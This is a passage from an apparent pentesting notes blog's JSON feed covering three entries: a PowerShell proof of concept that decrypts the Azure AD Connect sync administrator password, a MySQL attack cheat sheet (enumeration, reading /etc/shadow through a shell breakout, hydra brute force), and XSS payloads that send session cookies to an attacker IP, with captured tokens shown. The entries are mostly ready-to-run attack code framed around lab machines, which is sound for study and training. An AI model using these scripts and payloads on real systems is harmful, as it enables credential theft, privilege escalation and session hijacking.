decrypt it using mcrypt.dll.Write-Host \"AD Connect Sync Credential Extract POC (@_xpn_)`n\"$sqlserver = \"localhost\"$dbname = \"ADSync\"$client = New-Object System.Data.SqlClient.SqlConnection$client.ConnectionString = \"Server = $sqlserver; Database = $dbname; Integrated Security = True\"$client.Open()$cmd = $client.CreateCommand()$cmd.CommandText = \"SELECT keyset_id, instance_id, entropy FROM mms_server_configuration\"$reader = $cmd.ExecuteReader()$reader.Read() | Out-Null$key_id = $reader.GetInt32(0)$instance_id = $reader.GetGuid(1)$entropy = $reader.GetGuid(2)$reader.Close()$cmd = $client.CreateCommand()$cmd.CommandText = \"SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'\"$reader = $cmd.ExecuteReader()$reader.Read() | Out-Null$config = $reader.GetString(0)$crypted = $reader.GetString(1)$reader.Close()add-type -path 'C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\mcrypt.dll'$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager$km.LoadKeySet($entropy, $instance_id, $key_id)$key = $null$km.GetActiveCredentialKey([ref]$key)$key2 = $null$km.GetKey(1, [ref]$key2)$decrypted = $null$key2.DecryptBase64ToString($crypted, [ref]$decrypted)$domain = select-xml -Content $config -XPath \"//parameter[@name='forest-login-domain']\" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}$username = select-xml -Content $config -XPath \"//parameter[@name='forest-login-user']\" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}$password = select-xml -Content $decrypted -XPath \"//attribute\" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}Write-Host (\"Domain: \" + $domain.Domain)Write-Host (\"Username: \" + $username.Username)Write-Host (\"Password: \" + $password.Password)  Run the script*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; .\\decrypt.ps1AD Connect Sync Credential Extract POC (@_xpn_)Domain: MEGABANK.LOCALUsername: administratorPassword: d0m@in4dminyeah!*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt;GotchasOlder versions of AD Connect uses registry but newer ones uses DPAPI. Take this into consideration when using tools to extract the credentials.To see the version, use this command.Get-ItemProperty -Path \"C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\miiserver.exe\" | Format-list -Property * -ForceReferences  HTB Monteverde  Azure AD Connect for Red Teamers - XPN InfoSec Blog",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>Attacker can extract admin credentials from ADSync databases that is used for syncing credential hashes from onpremis AD to Azure AD.</p><h2 id=\"enviroment-setup-and-requirements\">Enviroment Setup and Requirements</h2><ul>  <li>AD sync must be running on victim machine using “Password Hash Synchronisation (PHS)”</li>  <li>Low privileged user must have permission on <code class=\"language-plaintext highlighter-rouge\">ADSync</code> DB</li>  <li>Attacker must have gained access to that low privileged account via winrm</li></ul><h2 id=\"steps\">Steps</h2><ul>  <li>Login to victim via winrm</li>  <li>Check if AD Sync is running</li></ul><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">Get-Item</span><span class=\"w\"> </span><span class=\"nt\">-Path</span><span class=\"w\"> </span><span class=\"nx\">HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ADSync</span><span class=\"w\"></span></code></pre></div></div><ul>  <li>Verify access to ADSync DB</li></ul><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">*</span><span class=\"n\">Evil-WinRM</span><span class=\"o\">*</span><span class=\"w\"> </span><span class=\"nx\">PS</span><span class=\"w\"> </span><span class=\"nx\">C:\\Users\\mhope\\Documents</span><span class=\"err\">&gt;</span><span class=\"w\"> </span><span class=\"nx\">sqlcmd</span><span class=\"w\"> </span><span class=\"nx\">/S</span><span class=\"w\"> </span><span class=\"nx\">localhost</span><span class=\"w\"> </span><span class=\"nx\">/d</span><span class=\"w\"> </span><span class=\"nx\">ADSync</span><span class=\"w\"> </span><span class=\"nx\">/q</span><span class=\"w\"> </span><span class=\"s2\">\"SELECT keyset_id, instance_id, entropy FROM mms_server_configuration\"</span><span class=\"w\"></span><span class=\"n\">keyset_id</span><span class=\"w\">   </span><span class=\"nx\">instance_id</span><span class=\"w\">                          </span><span class=\"nx\">entropy</span><span class=\"w\"></span><span class=\"o\">-----------</span><span class=\"w\"> </span><span class=\"o\">------------------------------------</span><span class=\"w\"> </span><span class=\"o\">------------------------------------</span><span class=\"w\">          </span><span class=\"mi\">1</span><span class=\"w\"> </span><span class=\"mi\">1852</span><span class=\"n\">B527-DD4F-4ECF-B541-EFCCBFF29E31</span><span class=\"w\"> </span><span class=\"nx\">194EC2FC-F186-46CF-B44D-071EB61F49CD</span><span class=\"w\"></span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"w\"> </span><span class=\"n\">rows</span><span class=\"w\"> </span><span class=\"nx\">affected</span><span class=\"p\">)</span><span class=\"w\"></span><span class=\"o\">*</span><span class=\"n\">Evil-WinRM</span><span class=\"o\">*</span><span class=\"w\"> </span><span class=\"nx\">PS</span><span class=\"w\"> </span><span class=\"nx\">C:\\Users\\mhope\\Documents</span><span class=\"err\">&gt;</span><span class=\"w\"> </span></code></pre></div></div><ul>  <li>Run this powershell script. This will get the encrypted string from <code class=\"language-plaintext highlighter-rouge\">mms_management_agent</code> table and decrypt it using <code class=\"language-plaintext highlighter-rouge\">mcrypt.dll</code>.</li></ul><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">Write-Host</span><span class=\"w\"> </span><span class=\"s2\">\"AD Connect Sync Credential Extract POC (@_xpn_)</span><span class=\"se\">`n</span><span class=\"s2\">\"</span><span class=\"w\"></span><span class=\"nv\">$sqlserver</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"s2\">\"localhost\"</span><span class=\"w\"></span><span class=\"nv\">$dbname</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"s2\">\"ADSync\"</span><span class=\"w\"></span><span class=\"nv\">$client</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"n\">New-Object</span><span class=\"w\"> </span><span class=\"nx\">System.Data.SqlClient.SqlConnection</span><span class=\"w\"></span><span class=\"nv\">$client</span><span class=\"o\">.</span><span class=\"nf\">ConnectionString</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"s2\">\"Server = </span><span class=\"nv\">$sqlserver</span><span class=\"s2\">; Database = </span><span class=\"nv\">$dbname</span><span class=\"s2\">; Integrated Security = True\"</span><span class=\"w\"></span><span class=\"nv\">$client</span><span class=\"o\">.</span><span class=\"nf\">Open</span><span class=\"p\">()</span><span class=\"w\"></span><span class=\"nv\">$cmd</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"nv\">$client</span><span class=\"o\">.</span><span class=\"nf\">CreateCommand</span><span class=\"p\">()</span><span class=\"w\"></span><span class=\"nv\">$cmd</span><span class=\"o\">.</span><span class=\"nf\">CommandText</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"s2\">\"SELECT keyset_id, instance_id, entropy FROM mms_server_configuration\"</span><span class=\"w\"></span><span class=\"nv\">$reader</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"nv\">$cmd</span><span class=\"o\">.</span><span class=\"nf\">ExecuteReader</span><span class=\"p\">()</span><span class=\"w\"></span><span class=\"nv\">$reader</span><span class=\"o\">.</span><span class=\"nf\">Read</span><span class=\"p\">()</span><span class=\"w\"> </span><span class=\"o\">|</span><span class=\"w\"> </span><span class=\"n\">Out-Null</span><span class=\"w\"></span><span class=\"nv\">$key_id</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"nv\">$reader</span><span class=\"o\">.</span><span class=\"nf\">GetInt32</span><span class=\"p\">(</span><span class=\"nx\">0</span><span class=\"p\">)</span><span class=\"w\"></span><span class=\"nv\">$instance_id</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"nv\">$reader</span><span class=\"o\">.</span><span class=\"nf\">GetGuid</span><span class=\"p\">(</span><span class=\"nx\">1</span><span class=\"p\">)</span><span class=\"w\"></span><span class=\"nv\">$entropy</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"nv\">$reader</span><span class=\"o\">.</span><span class=\"nf\">GetGuid</span><span class=\"p\">(</span><span class=\"nx\">2</span><span class=\"p\">)</span><span class=\"w\"></span><span class=\"nv\">$reader</span><span class=\"o\">.</span><span class=\"nf\">Close</span><span class=\"p\">()</span><span class=\"w\"></span><span class=\"nv\">$cmd</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"nv\">$client</span><span class=\"o\">.</span><span class=\"nf\">CreateCommand</span><span class=\"p\">()</span><span class=\"w\"></span><span class=\"nv\">$cmd</span><span class=\"o\">.</span><span class=\"nf\">CommandText</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"s2\">\"SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'\"</span><span class=\"w\"></span><span class=\"nv\">$reader</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"nv\">$cmd</span><span class=\"o\">.</span><span class=\"nf\">ExecuteReader</span><span class=\"p\">()</span><span class=\"w\"></span><span class=\"nv\">$reader</span><span class=\"o\">.</span><span class=\"nf\">Read</span><span class=\"p\">()</span><span class=\"w\"> </span><span class=\"o\">|</span><span class=\"w\"> </span><span class=\"n\">Out-Null</span><span class=\"w\"></span><span class=\"nv\">$config</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"nv\">$reader</span><span class=\"o\">.</span><span class=\"nf\">GetString</span><span class=\"p\">(</span><span class=\"nx\">0</span><span class=\"p\">)</span><span class=\"w\"></span><span class=\"nv\">$crypted</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"nv\">$reader</span><span class=\"o\">.</span><span class=\"nf\">GetString</span><span class=\"p\">(</span><span class=\"nx\">1</span><span class=\"p\">)</span><span class=\"w\"></span><span class=\"nv\">$reader</span><span class=\"o\">.</span><span class=\"nf\">Close</span><span class=\"p\">()</span><span class=\"w\"></span><span class=\"n\">add-type</span><span class=\"w\"> </span><span class=\"nt\">-path</span><span class=\"w\"> </span><span class=\"s1\">'C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\mcrypt.dll'</span><span class=\"w\"></span><span class=\"nv\">$km</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"n\">New-Object</span><span class=\"w\"> </span><span class=\"nt\">-TypeName</span><span class=\"w\"> </span><span class=\"nx\">Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager</span><span class=\"w\"></span><span class=\"nv\">$km</span><span class=\"o\">.</span><span class=\"nf\">LoadKeySet</span><span class=\"p\">(</span><span class=\"nv\">$entropy</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"nv\">$instance_id</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"nv\">$key_id</span><span class=\"p\">)</span><span class=\"w\"></span><span class=\"nv\">$key</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"bp\">$null</span><span class=\"w\"></span><span class=\"nv\">$km</span><span class=\"o\">.</span><span class=\"nf\">GetActiveCredentialKey</span><span class=\"p\">([</span><span class=\"n\">ref</span><span class=\"p\">]</span><span class=\"nv\">$key</span><span class=\"p\">)</span><span class=\"w\"></span><span class=\"nv\">$key2</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"bp\">$null</span><span class=\"w\"></span><span class=\"nv\">$km</span><span class=\"o\">.</span><span class=\"nf\">GetKey</span><span class=\"p\">(</span><span class=\"nx\">1</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"n\">ref</span><span class=\"p\">]</span><span class=\"nv\">$key2</span><span class=\"p\">)</span><span class=\"w\"></span><span class=\"nv\">$decrypted</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"bp\">$null</span><span class=\"w\"></span><span class=\"nv\">$key2</span><span class=\"o\">.</span><span class=\"nf\">DecryptBase64ToString</span><span class=\"p\">(</span><span class=\"nv\">$crypted</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"n\">ref</span><span class=\"p\">]</span><span class=\"nv\">$decrypted</span><span class=\"p\">)</span><span class=\"w\"></span><span class=\"nv\">$domain</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"n\">select-xml</span><span class=\"w\"> </span><span class=\"nt\">-Content</span><span class=\"w\"> </span><span class=\"nv\">$config</span><span class=\"w\"> </span><span class=\"nt\">-XPath</span><span class=\"w\"> </span><span class=\"s2\">\"//parameter[@name='forest-login-domain']\"</span><span class=\"w\"> </span><span class=\"o\">|</span><span class=\"w\"> </span><span class=\"n\">select</span><span class=\"w\"> </span><span class=\"p\">@{</span><span class=\"nx\">Name</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"s1\">'Domain'</span><span class=\"p\">;</span><span class=\"w\"> </span><span class=\"nx\">Expression</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"p\">{</span><span class=\"bp\">$_</span><span class=\"o\">.</span><span class=\"nf\">node</span><span class=\"o\">.</span><span class=\"nf\">InnerXML</span><span class=\"p\">}}</span><span class=\"w\"></span><span class=\"nv\">$username</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"n\">select-xml</span><span class=\"w\"> </span><span class=\"nt\">-Content</span><span class=\"w\"> </span><span class=\"nv\">$config</span><span class=\"w\"> </span><span class=\"nt\">-XPath</span><span class=\"w\"> </span><span class=\"s2\">\"//parameter[@name='forest-login-user']\"</span><span class=\"w\"> </span><span class=\"o\">|</span><span class=\"w\"> </span><span class=\"n\">select</span><span class=\"w\"> </span><span class=\"p\">@{</span><span class=\"nx\">Name</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"s1\">'Username'</span><span class=\"p\">;</span><span class=\"w\"> </span><span class=\"nx\">Expression</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"p\">{</span><span class=\"bp\">$_</span><span class=\"o\">.</span><span class=\"nf\">node</span><span class=\"o\">.</span><span class=\"nf\">InnerXML</span><span class=\"p\">}}</span><span class=\"w\"></span><span class=\"nv\">$password</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"n\">select-xml</span><span class=\"w\"> </span><span class=\"nt\">-Content</span><span class=\"w\"> </span><span class=\"nv\">$decrypted</span><span class=\"w\"> </span><span class=\"nt\">-XPath</span><span class=\"w\"> </span><span class=\"s2\">\"//attribute\"</span><span class=\"w\"> </span><span class=\"o\">|</span><span class=\"w\"> </span><span class=\"n\">select</span><span class=\"w\"> </span><span class=\"p\">@{</span><span class=\"nx\">Name</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"s1\">'Password'</span><span class=\"p\">;</span><span class=\"w\"> </span><span class=\"nx\">Expression</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"p\">{</span><span class=\"bp\">$_</span><span class=\"o\">.</span><span class=\"nf\">node</span><span class=\"o\">.</span><span class=\"nf\">InnerText</span><span class=\"p\">}}</span><span class=\"w\"></span><span class=\"n\">Write-Host</span><span class=\"w\"> </span><span class=\"p\">(</span><span class=\"s2\">\"Domain: \"</span><span class=\"w\"> </span><span class=\"o\">+</span><span class=\"w\"> </span><span class=\"nv\">$domain</span><span class=\"o\">.</span><span class=\"nf\">Domain</span><span class=\"p\">)</span><span class=\"w\"></span><span class=\"n\">Write-Host</span><span class=\"w\"> </span><span class=\"p\">(</span><span class=\"s2\">\"Username: \"</span><span class=\"w\"> </span><span class=\"o\">+</span><span class=\"w\"> </span><span class=\"nv\">$username</span><span class=\"o\">.</span><span class=\"nf\">Username</span><span class=\"p\">)</span><span class=\"w\"></span><span class=\"n\">Write-Host</span><span class=\"w\"> </span><span class=\"p\">(</span><span class=\"s2\">\"Password: \"</span><span class=\"w\"> </span><span class=\"o\">+</span><span class=\"w\"> </span><span class=\"nv\">$password</span><span class=\"o\">.</span><span class=\"nf\">Password</span><span class=\"p\">)</span><span class=\"w\"></span></code></pre></div></div><ul>  <li>Run the script</li></ul><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">*</span><span class=\"n\">Evil-WinRM</span><span class=\"o\">*</span><span class=\"w\"> </span><span class=\"nx\">PS</span><span class=\"w\"> </span><span class=\"nx\">C:\\Users\\mhope\\Documents</span><span class=\"err\">&gt;</span><span class=\"w\"> </span><span class=\"o\">.</span><span class=\"nx\">\\decrypt.ps1</span><span class=\"w\"></span><span class=\"n\">AD</span><span class=\"w\"> </span><span class=\"nx\">Connect</span><span class=\"w\"> </span><span class=\"nx\">Sync</span><span class=\"w\"> </span><span class=\"nx\">Credential</span><span class=\"w\"> </span><span class=\"nx\">Extract</span><span class=\"w\"> </span><span class=\"nx\">POC</span><span class=\"w\"> </span><span class=\"p\">(</span><span class=\"err\">@_</span><span class=\"n\">xpn_</span><span class=\"p\">)</span><span class=\"w\"></span><span class=\"n\">Domain:</span><span class=\"w\"> </span><span class=\"nx\">MEGABANK.LOCAL</span><span class=\"w\"></span><span class=\"n\">Username:</span><span class=\"w\"> </span><span class=\"nx\">administrator</span><span class=\"w\"></span><span class=\"n\">Password:</span><span class=\"w\"> </span><span class=\"nx\">d0m</span><span class=\"err\">@</span><span class=\"nx\">in4dminyeah</span><span class=\"o\">!</span><span class=\"w\"></span><span class=\"o\">*</span><span class=\"n\">Evil-WinRM</span><span class=\"o\">*</span><span class=\"w\"> </span><span class=\"nx\">PS</span><span class=\"w\"> </span><span class=\"nx\">C:\\Users\\mhope\\Documents</span><span class=\"err\">&gt;</span><span class=\"w\"></span></code></pre></div></div><h2 id=\"gotchas\">Gotchas</h2><p>Older versions of AD Connect uses registry but newer ones uses DPAPI. Take this into consideration when using tools to extract the credentials.</p><p>To see the version, use this command.</p><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">Get-ItemProperty</span><span class=\"w\"> </span><span class=\"nt\">-Path</span><span class=\"w\"> </span><span class=\"s2\">\"C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\miiserver.exe\"</span><span class=\"w\"> </span><span class=\"o\">|</span><span class=\"w\"> </span><span class=\"n\">Format-list</span><span class=\"w\"> </span><span class=\"nt\">-Property</span><span class=\"w\"> </span><span class=\"o\">*</span><span class=\"w\"> </span><span class=\"nt\">-Force</span><span class=\"w\"></span></code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li>HTB Monteverde</li>  <li><a href=\"https://blog.xpnsec.com/azuread-connect-for-redteam/\">Azure AD Connect for Red Teamers - XPN InfoSec Blog</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/02/18/extracting-creds-from-ad-connect",
            
            
            
            "tags": ["privesc","windows","azure"],
            
            "date_published": "2022-02-18T00:00:00+08:00",
            "date_modified": "2022-02-18T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/02/16/mysql",
            "title": "MySQL",
            "summary": "MySQL",
            "content_text": "Ports  3306/tcpGathering Information from outside# nmapnmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.10.166.72Authentication# extracting creds from filescat /etc/mysql/debian.cnfgrep -oaE \"[-_\\.\\*a-Z0-9]{3,}\" | grep -v \"mysql_native_password\"Gathering infor inside SQL shell; Checks versionselect @@version;; Checks userselect user();; checks permissions and privilegesshow grants for 'root'@'localhost';\tPrivesc; Breaks out from shell\\! cat /etc/passwd\\! cat /etc/shadow\\! bashFiles and directories# settingscat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v \"#\" | grep \"user\"Brute Force# mysql over ssh tunnelhydra -V -L users.txt -P passwords.txt 127.0.0.1 -s 9000 mysqlExploits  UDF - used in vulnhub lord of the rootOther resources  3306 - Pentesting Mysql - HackTricks",
            "content_html": "<h2 id=\"ports\">Ports</h2><ul>  <li>3306/tcp</li></ul><h2 id=\"gathering-information-from-outside\">Gathering Information from outside</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># nmap</span>nmap <span class=\"nt\">-sV</span> <span class=\"nt\">-p</span> 3306 <span class=\"nt\">--script</span> mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.10.166.72</code></pre></div></div><h2 id=\"authentication\">Authentication</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># extracting creds from files</span><span class=\"nb\">cat</span> /etc/mysql/debian.cnf<span class=\"nb\">grep</span> <span class=\"nt\">-oaE</span> <span class=\"s2\">\"[-_</span><span class=\"se\">\\.\\*</span><span class=\"s2\">a-Z0-9]{3,}\"</span> | <span class=\"nb\">grep</span> <span class=\"nt\">-v</span> <span class=\"s2\">\"mysql_native_password\"</span></code></pre></div></div><h2 id=\"gathering-infor-inside-sql-shell\">Gathering infor inside SQL shell</h2><div class=\"language-sql highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"p\">;</span> <span class=\"n\">Checks</span> <span class=\"k\">version</span><span class=\"k\">select</span> <span class=\"o\">@@</span><span class=\"k\">version</span><span class=\"p\">;</span><span class=\"p\">;</span> <span class=\"n\">Checks</span> <span class=\"k\">user</span><span class=\"k\">select</span> <span class=\"k\">user</span><span class=\"p\">();</span><span class=\"p\">;</span> <span class=\"n\">checks</span> <span class=\"n\">permissions</span> <span class=\"k\">and</span> <span class=\"k\">privileges</span><span class=\"k\">show</span> <span class=\"n\">grants</span> <span class=\"k\">for</span> <span class=\"s1\">'root'</span><span class=\"o\">@</span><span class=\"s1\">'localhost'</span><span class=\"p\">;</span>\t</code></pre></div></div><h2 id=\"privesc\">Privesc</h2><div class=\"language-sql highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"p\">;</span> <span class=\"n\">Breaks</span> <span class=\"k\">out</span> <span class=\"k\">from</span> <span class=\"n\">shell</span><span class=\"err\">\\</span><span class=\"o\">!</span> <span class=\"n\">cat</span> <span class=\"o\">/</span><span class=\"n\">etc</span><span class=\"o\">/</span><span class=\"n\">passwd</span><span class=\"err\">\\</span><span class=\"o\">!</span> <span class=\"n\">cat</span> <span class=\"o\">/</span><span class=\"n\">etc</span><span class=\"o\">/</span><span class=\"n\">shadow</span><span class=\"err\">\\</span><span class=\"o\">!</span> <span class=\"n\">bash</span></code></pre></div></div><h2 id=\"files-and-directories\">Files and directories</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># settings</span><span class=\"nb\">cat</span> /etc/mysql/mysql.conf.d/mysqld.cnf | <span class=\"nb\">grep</span> <span class=\"nt\">-v</span> <span class=\"s2\">\"#\"</span> | <span class=\"nb\">grep</span> <span class=\"s2\">\"user\"</span></code></pre></div></div><h2 id=\"brute-force\">Brute Force</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># mysql over ssh tunnel</span>hydra <span class=\"nt\">-V</span> <span class=\"nt\">-L</span> users.txt <span class=\"nt\">-P</span> passwords.txt 127.0.0.1 <span class=\"nt\">-s</span> 9000 mysql</code></pre></div></div><h2 id=\"exploits\">Exploits</h2><ul>  <li><a href=\"https://www.exploit-db.com/exploits/1518\">UDF</a> - used in vulnhub lord of the root</li></ul><h2 id=\"other-resources\">Other resources</h2><ul>  <li><a href=\"https://book.hacktricks.xyz/pentesting/pentesting-mysql\">3306 - Pentesting Mysql - HackTricks</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/02/16/mysql",
            
            
            
            "tags": ["db","enum"],
            
            "date_published": "2022-02-16T00:00:00+08:00",
            "date_modified": "2022-02-16T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/02/12/cookie-session-hijacking",
            "title": "Cookie/Session Hijacking",
            "summary": "Cookie/Session Hijacking",
            "content_text": "Intercepting via netcat  Open netcat listener on attacker machinenc -nlvp 4444  Submit this XSS script on the form&lt;script&gt;new Image().src=\"http://10.11.40.33:4444/bogus.php?output=\"+document.cookie;&lt;/script&gt;  You will be able to intercept the cookie➜  marketplace nc -nlvp 4444        listening on [any] 4444 ...connect to [10.11.40.33] from (UNKNOWN) [10.11.40.33] 57706GET /bogus.php?output=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoiZGVtbyIsImFkbWluIjpmYWxzZSwiaWF0IjoxNjI4MTU5MzYzfQ.Nka6_SPBNEE1B3PmDWg4p7c3cG3BF4zqhTMCgGa6bJM HTTP/1.1Host: 10.11.40.33:4444Connection: keep-aliveUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8Referer: http://10.10.177.20/Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9  You can use this method to grab an admin cookie  An alternative is using fetch and redirecting it to your HTTP listener# using fetch&lt;script&gt;fetch(\"http://10.11.40.33:4444/\"+document.cookie)&lt;/script&gt;  NOTE: There mght be delay in seeing the output so you might want to be patientRedirect to another page  Insert this payload to comment section# 10.10.39.208 - victim ip&lt;script&gt;document.location='http://10.10.39.208/log/'+document.cookie&lt;/script&gt;  Refresh the page  Go to /logsOther payloads# sent by server -&gt; cookie: deniedcookie: grantedReferences  HTB RedCross  Cookies Hacking - HackTricks",
            "content_html": "<h2 id=\"intercepting-via-netcat\">Intercepting via netcat</h2><ul>  <li>Open netcat listener on attacker machine</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>nc <span class=\"nt\">-nlvp</span> 4444</code></pre></div></div><ul>  <li>Submit this XSS script on the form</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>&lt;script&gt;new Image().src=\"http://10.11.40.33:4444/bogus.php?output=\"+document.cookie;&lt;/script&gt;</code></pre></div></div><p><img src=\"/spindel/assets/Cookie%20(Session)%20Hijacking/BC7E0478-D577-462B-BCF7-A9A0D0590D87.png\" alt=\"\" /></p><ul>  <li>You will be able to intercept the cookie</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  marketplace nc <span class=\"nt\">-nlvp</span> 4444        listening on <span class=\"o\">[</span>any] 4444 ...connect to <span class=\"o\">[</span>10.11.40.33] from <span class=\"o\">(</span>UNKNOWN<span class=\"o\">)</span> <span class=\"o\">[</span>10.11.40.33] 57706GET /bogus.php?output<span class=\"o\">=</span><span class=\"nv\">token</span><span class=\"o\">=</span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoiZGVtbyIsImFkbWluIjpmYWxzZSwiaWF0IjoxNjI4MTU5MzYzfQ.Nka6_SPBNEE1B3PmDWg4p7c3cG3BF4zqhTMCgGa6bJM HTTP/1.1Host: 10.11.40.33:4444Connection: keep-aliveUser-Agent: Mozilla/5.0 <span class=\"o\">(</span>X11<span class=\"p\">;</span> Linux x86_64<span class=\"o\">)</span> AppleWebKit/537.36 <span class=\"o\">(</span>KHTML, like Gecko<span class=\"o\">)</span> Chrome/91.0.4472.114 Safari/537.36Accept: image/avif,image/webp,image/apng,image/svg+xml,image/<span class=\"k\">*</span>,<span class=\"k\">*</span>/<span class=\"k\">*</span><span class=\"p\">;</span><span class=\"nv\">q</span><span class=\"o\">=</span>0.8Referer: http://10.10.177.20/Accept-Encoding: <span class=\"nb\">gzip</span>, deflateAccept-Language: en-US,en<span class=\"p\">;</span><span class=\"nv\">q</span><span class=\"o\">=</span>0.9</code></pre></div></div><ul>  <li>You can use this method to grab an admin cookie</li>  <li>An alternative is using <code class=\"language-plaintext highlighter-rouge\">fetch</code> and redirecting it to your HTTP listener</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># using fetch</span>&lt;script&gt;fetch<span class=\"o\">(</span><span class=\"s2\">\"http://10.11.40.33:4444/\"</span>+document.cookie<span class=\"o\">)</span>&lt;/script&gt;</code></pre></div></div><ul>  <li>NOTE: There mght be delay in seeing the output so you might want to be patient</li></ul><h2 id=\"redirect-to-another-page\">Redirect to another page</h2><ul>  <li>Insert this payload to comment section</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># 10.10.39.208 - victim ip</span>&lt;script&gt;document.location<span class=\"o\">=</span><span 